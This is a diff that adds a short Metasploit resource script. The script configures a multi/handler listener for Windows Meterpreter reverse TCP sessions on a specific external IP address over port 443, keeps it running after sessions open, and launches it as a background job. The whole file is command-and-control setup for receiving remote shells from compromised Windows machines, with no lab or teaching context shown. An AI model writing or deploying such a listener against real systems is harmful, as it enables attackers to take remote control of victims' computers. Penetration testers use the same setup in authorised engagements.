@@ -1,0 +1,7 @@
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 100.126.227.225
+set LPORT 443
+set ExitOnSession false
+exploit -j
+
